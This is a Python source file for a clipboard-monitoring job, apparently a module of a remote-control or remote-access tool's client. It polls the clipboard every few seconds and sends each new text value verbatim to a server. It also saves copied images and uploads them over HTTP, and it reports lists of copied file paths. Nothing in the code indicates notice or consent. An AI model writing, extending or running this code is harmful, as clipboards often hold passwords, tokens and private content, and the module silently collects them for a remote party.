import hashlib
import io
import os
import threading
import time

from client.jobs.core.job import Job
from core.utils.formatting import get_size, get_time
from core.utils.logger import logger


class ClipboardMonitor(Job):
    def __init__(self):
        super().__init__()
        self.recent_text = None
        self.image_hash = None
        self.file_list = None
        self.transfer_images = True
        self.interval = 3

    def run(self):
        try:
            time.sleep(2)
            import pyperclip
            self.send_to_server(1, 'Dependency loaded: pyperclip', 0)

            self.mark_running()
            self.send_to_server(1, 'Clipboard monitor started', 0)

            if self.transfer_images:
                from PIL import ImageGrab, Image
                self.send_to_server(1, 'Dependency loaded: pillow', 0)

                while not self.stop_event.is_set():
                    clipboard_data = ImageGrab.grabclipboard()

                    if clipboard_data is None:
                        clipboard_text = pyperclip.paste()
                        self._handle_text_change(clipboard_text)
                    elif isinstance(clipboard_data, Image.Image):
                        self._handle_image_change(clipboard_data)
                    elif isinstance(clipboard_data, list):
                        self._handle_file_change(clipboard_data)
                    else:
                        self.send_to_server(0, f'Unsupported clipboard content type: {type(clipboard_data)}', 0)

                    time.sleep(self.interval)
            else:
                while not self.stop_event.is_set():
                    clipboard_text = pyperclip.paste()
                    self._handle_text_change(clipboard_text)
                    time.sleep(self.interval)

            self.send_to_server(1, 'Clipboard monitor stopped', 0)
        except Exception as e:
            self.send_to_server(0, f'Clipboard monitor error: {e}', 0)
        finally:
            self.mark_stopped()
            logger.info(f'Thread ended: {threading.current_thread().name}')
            self.send_to_server(1, f'Task ended: {threading.current_thread().name}', 1)

    def stop(self, notify: bool = True):
        self.request_stop(notify=notify)

    def _handle_text_change(self, text: str):
        if text and text != self.recent_text:
            self.recent_text = text
            self.send_to_server(1, f'Clipboard text changed: {text}', 0)

    def _handle_image_change(self, image):
        image_hash = hashlib.sha256(image.tobytes()).hexdigest()
        if image_hash != self.image_hash:
            self.image_hash = image_hash

            file_name = f'clipboard_image_{get_time()}.png'

            try:
                image.save(file_name, 'PNG')
                file_size = os.path.getsize(file_name)

                self.send_to_server(
                    1,
                    f'Clipboard image detected, queueing file transfer: {file_name} ({get_size(file_size)})',
                    0
                )

                self.upload_file_via_http(file_name, 'clipboard_images')
                self.send_to_server(1, f'Clipboard image queued successfully: {file_name}', 0)

            except Exception as e:
                self.send_to_server(0, f'Failed to save clipboard image: {e}', 0)

            self.send_to_server(1, 'Clipboard image sent successfully', 0)

    def _handle_file_change(self, files):
        file_list = ', '.join(files)
        if file_list != self.file_list:
            self.file_list = file_list
            self.send_to_server(1, f'Clipboard file list changed: {self.file_list}', 0)